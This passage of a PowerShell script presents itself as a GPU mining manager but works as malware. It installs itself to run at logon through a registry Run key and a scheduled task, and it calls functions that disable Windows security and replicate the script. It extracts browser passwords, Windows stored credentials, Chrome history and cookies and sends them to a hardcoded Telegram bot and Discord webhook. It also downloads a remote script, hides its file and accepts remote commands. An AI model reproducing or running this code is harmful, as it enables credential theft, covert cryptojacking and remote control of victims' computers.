    }
}

function Start-Miner {
    param ($Algorithm, $Pool, $GpuIndex = -1)
    Write-Log "Starting miner for $Algorithm..."
    try {
        if (-not $global:supportedAlgorithms[$Algorithm]) { throw "Invalid algorithm: $Algorithm" }
        $miner = $global:supportedAlgorithms[$Algorithm]
        $exePath = "$baseDir\$miner\$miner.exe"
        if (-not (Test-Path $exePath)) { throw "Miner missing: $exePath" }
        $args = switch ($miner) {
            "T-Rex"   { "-a $Algorithm -o $Pool -u ${env:GPU_WALLET}.$env:COMPUTERNAME -p x --api-bind-http 127.0.0.1:4067" }
            "NBMiner" { "-a $Algorithm -o $Pool -u ${env:GPU_WALLET}.$env:COMPUTERNAME -p x" }
            "XMRig"   { "--donate-level=1 -o $Pool -u ${env:XMR_WALLET} -p $env:COMPUTERNAME --http-enabled" }
            "lolMiner" { "-a $Algorithm -o $Pool -u ${env:GPU_WALLET}.$env:COMPUTERNAME -p x" }
        }
        if ($GpuIndex -ge 0) { $args += " --devices $GpuIndex" }
        $process = Start-Process -FilePath $exePath -ArgumentList $args -NoNewWindow -PassThru
        Write-Log "$miner started (PID: $($process.Id))"
        return $process
    } catch {
        Write-Log "Start failed: $_"
        Send-TelegramMessage -Message "Miner start failed: $_" -Priority 1
        return $null
    }
}

function Stop-Miner {
    Write-Log "Stopping miners..."
    try {
        Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue | Stop-Process -Force
        Write-Log "Miners stopped."
    } catch {
        Write-Log "Stop failed: $_"
    }
}

function Initialize-Miners {
    Write-Log "Initializing miners..."
    try {
        $gpu = if (Test-Path "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe") { "NVIDIA" }
            elseif (Get-CimInstance Win32_VideoController | Where-Object { $_.Name -match "AMD|Radeon" }) { "AMD" }
            else { $null }
        if (-not $gpu) {
            Write-Log "No GPU detected."
            Send-TelegramMessage -Message "No GPU detected." -Priority 1
            return $false
        }
        $miners = @(
            @{ Name = "t-rex"; Url = "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip"; Path = "$baseDir\T-Rex" },
            @{ Name = "nbminer"; Url = "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip"; Path = "$baseDir\NBMiner" },
            @{ Name = "xmrig"; Url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"; Path = "$baseDir\XMRig" },
            @{ Name = "lolminer"; Url = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Win64.zip"; Path = "$baseDir\lolMiner" }
        )
        foreach ($m in $miners) { 
            $result = Install-Miner $m.Name $m.Url $m.Path
            if (-not $result) { throw "Failed to install $($m.Name)." }
        }
        $coin = Get-MostProfitableCoin
        if (-not $coin) {
            Write-Log "No coin selected."
            return $false
        }
        $pool = Get-BestPool $coin.algorithm
        $script:currentCoin = $coin.tag
        $script:currentPool = $pool
        $script:currentAlgorithm = $coin.algorithm
        if ($gpu -eq "NVIDIA") { Set-GPUOverclock }
        $gpus = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        for ($i = 0; $i -lt $gpus.Count; $i++) { 
            $result = Start-Miner $coin.algorithm $pool $i 
            if (-not $result) { throw "Failed to start miner for GPU $i." }
        }
        Write-Log "Miners initialized for $coin.tag."
        Send-TelegramMessage -Message "Mining started for $coin.tag." -Priority 1
        Send-DiscordWebhook -Message "Mining initialized." -Priority 1
        $script:isMining = $true
        return $true
    } catch {
        Write-Log "Initialization failed: $_"
        Send-TelegramMessage -Message "Initialization failed: $_" -Priority 1
        return $false
    }
}

# System Monitoring
function Get-GPUPowerUsage {
    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
    if (Test-Path $nvidiaSmi) {
        try {
            $powerOutput = & $nvidiaSmi --query-gpu=power.draw --format=csv,noheader,nounits
            $power = if ($powerOutput -match '^\d+(\.\d+)?$') { [double]$powerOutput } else { 0 }
            Write-Log "Power usage: $power W"
            return $power
        } catch {
            Write-Log "Failed to get power usage: $_"
            return 0
        }
    }
    Write-Log "nvidia-smi missing. Default: 0 W."
    return 0
}

function Get-PoolLatency {
    try {
        $poolHost = ($script:currentPool -replace "stratum\+tcp://", "") -split ":" | Select-Object -First 1
        $start = Get-Date
        $test = Test-NetConnection -ComputerName $poolHost -Port 443 -WarningAction SilentlyContinue
        $latency = if ($test.TcpTestSucceeded) { [int](((Get-Date) - $start).TotalMilliseconds) } else { 9999 }
        Write-Log "Latency: $latency ms"
        return $latency
    } catch {
        Write-Log "Latency check failed: $_"
        return 9999
    }
}

function Get-GPUTemperature {
    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
    if (Test-Path $nvidiaSmi) {
        try {
            $tempOutput = & $nvidiaSmi --query-gpu=temperature.gpu --format=csv,noheader
            $temp = if ($tempOutput -match '^\d+$') { [int]$tempOutput } else { 50 }
            if ($temp -gt 80) {
                $script:overheatCount++
                Send-TelegramMessage -Message "Overheating: $temp°C" -Priority 1
            }
            Write-Log "Temperature: $temp°C"
            return $temp
        } catch {
            Write-Log "Failed to get temperature: $_"
            return 50
        }
    }
    Write-Log "nvidia-smi missing. Default: 50°C."
    return 50
}

function Get-MiningStatus {
    Write-Log "Retrieving status..."
    try {
        $status = @{
            Algorithm    = $script:currentAlgorithm
            Hashrate     = "$($script:lastHashrate) MH/s"
            Earnings     = "$($script:totalEarnings) USD"
            GPUTemp      = "$(Get-GPUTemperature)°C"
            PowerUsage   = "$(Get-GPUPowerUsage) W"
            PoolLatency  = "$(Get-PoolLatency) ms"
            CurrentCoin  = $script:currentCoin
            CurrentPool  = $script:currentPool
        }
        Write-Log "Status retrieved."
        return $status
    } catch {
        Write-Log "Status retrieval failed: $_"
        return $null
    }
}

# Main Monitoring
function Start-MinerMonitoring {
    Write-Log "Starting monitoring..."
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty $regPath -Name "AdvancedMiner" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$miningScriptPath`"" -ErrorAction SilentlyContinue
        $taskName = "AdvancedMiner"
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        }
        Register-ScheduledTask -TaskName $taskName -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$miningScriptPath`"") -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive) -Force -ErrorAction SilentlyContinue
        Disable-WindowsSecurity
        Set-SleepPrevention
        Start-SelfReplication

        $creds = Get-Credentials
        if ($creds) {
            $telegramMsg = "*Extracted Browser Credentials*`n`n"
            $discordEmbeds = @()
            foreach ($cred in ($creds | Sort-Object Source, Timestamp)) {
                $telegramMsg += "🔒 **$($cred.Source)**`n- URL: $($cred.URL)`n- Username: $($cred.Username)`n- Password: $($cred.Password)`n- Time: $($cred.Timestamp)`n`n"
                $discordEmbeds += @{
                    title = "$($cred.Source) Credential"
                    fields = @(
                        @{ name = "URL"; value = $cred.URL; inline = $true }
                        @{ name = "Username"; value = $cred.Username; inline = $true }
                        @{ name = "Password"; value = $cred.Password; inline = $true }
                        @{ name = "Timestamp"; value = $cred.Timestamp; inline = $false }
                    )
                    color = 5814783
                }
            }
            $creds | ConvertTo-Json -Depth 10 | Out-File $credentialsFile -ErrorAction Stop
            Send-TelegramMessage -Message $telegramMsg -Priority 1
            Send-DiscordWebhook -Embeds $discordEmbeds -Priority 1
            Send-TelegramFile -FilePath $credentialsFile -Priority 1
        } else {
            Send-TelegramMessage -Message "No browser credentials found." -Priority 1
            Send-DiscordWebhook -Message "No browser credentials found." -Priority 1
        }

        $outputFile = "${env:TEMP}\WinCredMan.txt"
        try {
            $winCreds = cmdkey /list
            if ($winCreds -and ($winCreds -join "").Trim()) {
                $winCredMsg = "*Windows Credentials*`n`n``````n$($winCreds | Out-String)`n``````"
                $winCreds | Out-String | Out-File $outputFile -Encoding UTF8 -ErrorAction Stop
                Send-TelegramMessage -Message $winCredMsg -Priority 1
                Send-DiscordWebhook -Embeds @(@{ title = "Windows Credentials"; description = "``````n$($winCreds | Out-String)`n``````"; color = 5814783; timestamp = (Get-Date).ToString("o") }) -Priority 1
                Send-TelegramFile -FilePath $outputFile -Priority 1
            } else {
                Send-TelegramMessage -Message "No Windows credentials found." -Priority 1
                Send-DiscordWebhook -Message "No Windows credentials found." -Priority 1
            }
        } catch {
            Write-Log "Windows credentials failed: $_"
        } finally {
            Remove-Item $outputFile -ErrorAction SilentlyContinue
        }

        Get-ChromeHistory
        Get-ChromeCookies

        $switchInterval = 900
        $statusInterval = 3600
        $lastStatus = Get-Date
        $overclockJob = Start-Job -ScriptBlock { while ($true) { Set-GPUOverclock; Start-Sleep 300 } }
        while ($true) {
            try {
                $now = Get-Date
                if (($now - $script:lastSwitchTime).TotalSeconds -ge $switchInterval) {
                    $coin = Get-MostProfitableCoin
                    if ($coin -and $coin.algorithm -ne $script:currentAlgorithm) {
                        $pool = Get-BestPool $coin.algorithm
                        Stop-Miner
                        $gpus = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
                        for ($i = 0; $i -lt $gpus.Count; $i++) { 
                            Start-Miner $coin.algorithm $pool $i 
                        }
                        $script:currentAlgorithm = $coin.algorithm
                        $script:currentCoin = $coin.tag
                        $script:currentPool = $pool
                        $script:lastSwitchTime = $now
                    }
                }
                if (($now - $lastStatus).TotalSeconds -ge $statusInterval) {
                    $status = Get-MiningStatus
                    if ($status) {
                        $msg = "*Mining Status*`n`n**Algorithm**: $($status.Algorithm)`n**Hashrate**: $($status.Hashrate)`n**Earnings**: $($status.Earnings)`n**GPU Temp**: $($status.GPUTemp)`n**Power Usage**: $($status.PowerUsage)`n**Pool Latency**: $($status.PoolLatency)`n**Coin**: $($status.CurrentCoin)`n**Pool**: $($status.CurrentPool)"
                        Send-TelegramMessage -Message $msg
                        $embed = @{
                            title = "Mining Status"
                            description = "Stats for $env:COMPUTERNAME"
                            fields = @(
                                @{ name = "Algorithm"; value = $status.Algorithm; inline = $true }
                                @{ name = "Hashrate"; value = $status.Hashrate; inline = $true }
                                @{ name = "Earnings"; value = $status.Earnings; inline = $true }
                                @{ name = "GPU Temp"; value = $status.GPUTemp; inline = $true }
                                @{ name = "Power Usage"; value = $status.PowerUsage; inline = $true }
                                @{ name = "Pool Latency"; value = $status.PoolLatency; inline = $true }
                                @{ name = "Coin"; value = $status.CurrentCoin; inline = $true }
                                @{ name = "Pool"; value = $status.CurrentPool; inline = $true }
                            )
                            color = if ([int]($status.GPUTemp -replace "°C", "") -gt 80) { 16711680 } else { 3447003 }
                            timestamp = (Get-Date).ToString("o")
                        }
                        Send-DiscordWebhook -Embeds @($embed)
                    }
                    $lastStatus = $now
                }
                if (($now - $script:lastUpdateCheck).TotalDays -ge 1) {
                    $minersInfo = @(
                        @{ Name = "t-rex"; Repo = "trexminer/T-Rex"; Url = "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip"; Path = "$baseDir\T-Rex" },
                        @{ Name = "nbminer"; Repo = "NebuTech/NBMiner"; Url = "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip"; Path = "$baseDir\NBMiner" },
                        @{ Name = "xmrig"; Repo = "xmrig/xmrig"; Url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"; Path = "$baseDir\XMRig" },
                        @{ Name = "lolminer"; Repo = "Lolliedieb/lolMiner-releases"; Url = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Win64.zip"; Path = "$baseDir\lolMiner" }
                    )
                    foreach ($m in $minersInfo) {
                        $versionFile = "$($m.Path)\version.txt"
                        $current = if (Test-Path $versionFile) { Get-Content $versionFile } else { "0.0.0" }
                        $latest = try { 
                            (Invoke-RestMethod "https://api.github.com/repos/$($m.Repo)/releases/latest" -ErrorAction Stop).tag_name 
                        } catch { 
                            Write-Log "Failed to check latest version for $($m.Name): $_"
                            $null 
                        }
                        if ($latest -and [Version]$latest.TrimStart('v') -gt [Version]$current) {
                            Install-Miner $m.Name $m.Url $m.Path
                            Set-Content $versionFile $latest
                        }
                    }
                    $script:lastUpdateCheck = $now
                }
                Invoke-NotificationQueue
                Start-Sleep -Seconds 10
            } catch {
                Write-Log "Monitoring error: $_"
                Send-TelegramMessage -Message "Monitoring error: $_" -Priority 1
                Start-Sleep -Seconds 10
            }
        }
    } catch {
        Write-Log "Monitoring failed: $_"
        Send-TelegramMessage -Message "Monitoring failed: $_" -Priority 1
    } finally {
        if ($overclockJob) {
            Stop-Job $overclockJob -ErrorAction SilentlyContinue
            Remove-Job $overclockJob -ErrorAction SilentlyContinue
        }
    }
}

# Main Execution
try {
    Write-Log "Script started."
    if (-not (Test-Path $miningScriptPath)) {
        try {
            Invoke-WebRequest -Uri $miningScriptUrl -OutFile $miningScriptPath -UseBasicParsing -ErrorAction Stop
            Write-Log "mining.ps1 downloaded."
        } catch {
            Write-Log "Failed to download mining.ps1: $_"
            exit 1
        }
    }
    if (-not (Test-Path $sqlite3Path)) {
        $zipPath = "${env:TEMP}\sqlite3.zip"
        try {
            Invoke-WebRequest -Uri $sqlite3Url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
            Expand-Archive $zipPath $baseDir -Force -ErrorAction Stop
            $sqliteExe = Get-ChildItem $baseDir -Recurse -Filter "sqlite3.exe" | Select-Object -First 1
            if (-not $sqliteExe) { throw "sqlite3.exe not found in archive." }
            Move-Item $sqliteExe.FullName $sqlite3Path -Force
            if (-not (Test-Path $sqlite3Path)) { throw "Failed to install sqlite3.exe." }
            Write-Log "sqlite3.exe installed."
        } catch {
            Write-Log "SQLite3 installation failed: $_"
            exit 1
        } finally {
            Remove-Item $zipPath -ErrorAction SilentlyContinue
        }
    }
    if (-not (Test-Path $configFile)) {
        $defaultConfig = @{
            telegram_token = "7096283583:AAE7iv8FKDJZ5Ok5Bq0NdZ5Qa_a1KoIYfjg"
            telegram_chat_id = "7486857021"
            discord_webhook = "https://discord.com/api/webhooks/1359077352465891439/PKcE8DWd0SS5dTsL6b7Tjb-aPTJjPDfatekQRHpcsCp3RhtjjB4DDZsBqHUjfqTytImf"
            pool_fee = 0.01
            supported_algorithms = @{
                Ethash = "T-Rex"
                KawPow = "NBMiner"
                RandomX = "XMRig"
                Autolykos = "lolMiner"
            }
        }
        Write-Log "Warning: Using default config with hardcoded credentials. Update $configFile for security."
        $defaultConfig | ConvertTo-Json -Depth 10 | Out-File $configFile -ErrorAction Stop
        Write-Log "Config created."
    }
    try {
        $configRaw = Get-Content $configFile -Raw -ErrorAction Stop
        if (-not $configRaw) { throw "Config file is empty." }
        $config = $configRaw | ConvertFrom-Json -ErrorAction Stop
        if (-not $config.telegram_token -or -not $config.telegram_chat_id -or -not $config.discord_webhook) {
            throw "Config missing required fields."
        }
        $global:telegramBotToken = $config.telegram_token
        $global:telegramChatId = $config.telegram_chat_id
        $global:discordWebhookUrl = $config.discord_webhook
        $global:supportedAlgorithms = $config.supported_algorithms.psobject.Properties | ForEach-Object { 
            $_.Name, $_.Value 
        } | ForEach-Object -Begin { $hash = @{} } -Process { $hash[$_[0]] = $_[1] } -End { $hash }
    } catch {
        Write-Log "Config load failed: $_"
        exit 1
    }
    if ([string]::IsNullOrEmpty($global:telegramChatId)) {
        Write-Log "Error: telegram_chat_id is not set in config."
        exit 1
    }
    Write-Log "Config loaded."
    Send-TelegramMessage -Message "Script started. Commands: /startmining, /stopmining, /status, /getcreds, /reboot, /shutdown" -Priority 1
    Send-DiscordWebhook -Message "Script initialized." -Priority 1
    $telegramJob = Start-Job -Name "TelegramListener" -ScriptBlock { Start-TelegramListener }
    if (Initialize-Miners) {
        Write-Log "Miners initialized."
        Set-ItemProperty $miningScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
        Start-MinerMonitoring
    } else {
        Write-Log "Initialization failed."
        Send-TelegramMessage -Message "Initialization failed." -Priority 1
        exit 1
    }
} catch {
    Write-Log "Startup failed: $_"
    Send-TelegramMessage -Message "Startup failed: $_" -Priority 1
    exit 1
} finally {
    Get-Job | Stop-Job -ErrorAction SilentlyContinue
    Get-Job | Remove-Job -ErrorAction SilentlyContinue
}
